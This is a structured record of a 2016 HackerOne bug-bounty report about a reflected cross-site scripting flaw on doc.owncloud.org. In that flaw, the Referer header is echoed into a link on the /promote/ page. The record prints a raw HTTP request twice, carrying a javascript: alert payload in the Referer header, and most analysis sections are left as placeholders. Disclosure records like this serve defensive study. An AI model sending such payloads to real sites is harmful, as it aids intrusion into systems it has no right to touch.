# doc.owncloud.org: XSS via Referrer

## Metadata
- **Source:** HackerOne
- **Report:** 130951 | https://hackerone.com/reports/130951
- **Submitted:** 2016-04-15
- **Reporter:** sandh0t
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hi,

The Referer Header in the following request, can be used to trigger an XSS.


GET /promote/ HTTP/1.1
Host: doc.owncloud.org
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Referer: javascript:alert('XSS');
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: k

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi,

The Referer Header in the following request, can be used to trigger an XSS.


GET /promote/ HTTP/1.1
Host: doc.owncloud.org
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Referer: javascript:alert('XSS');
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 2

The Referrer Value is reflected in the page (in the "referring page" link) see the PoC, however the XSS is not trigger until the victim click in the link.


</details>

---
*Analysed by Claude on 2026-05-24*
